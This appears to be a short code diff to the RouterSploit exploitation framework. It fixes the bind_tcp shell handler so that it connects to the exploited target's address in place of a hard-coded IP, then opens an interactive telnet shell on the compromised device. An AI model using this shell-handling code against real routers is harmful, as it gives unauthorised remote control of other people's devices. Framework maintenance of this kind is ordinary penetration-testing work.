@@ -7,6 +7,8 @@ import time
 
 from printer import printer_queue
 
+from routersploit import validators 
+
 from routersploit.utils import (
     print_info,
     print_error,
@@ -68,6 +70,7 @@ def shell(exploit, architecture="", method="", **params):
             if c[0] == "bind_tcp":
                 try:
                     options['technique'] = "bind_tcp"
+                    options['rhost'] = validators.ipv4(exploit.target)
                     options['rport'] = int(c[1])
                     options['lhost'] = c[2]
                     options['lport'] = int(c[3])
@@ -158,13 +161,13 @@ class Communication(object):
         if self.options['technique'] == "bind_tcp":
             self.execute_binary(location, self.binary_name)
 
-            print_status("Connecting to {}:{}".format('192.168.0.100', self.options['rport']))
+            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
             time.sleep(2)
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-            sock.connect(('192.168.0.100', self.options['rport']))
+            sock.connect((self.options['rhost'], self.options['rport']))
 
-            print_status("Enjoy shell")
+            print_success("Enjoy your shell")
             tn = telnetlib.Telnet()
             tn.sock = sock
             tn.interact()
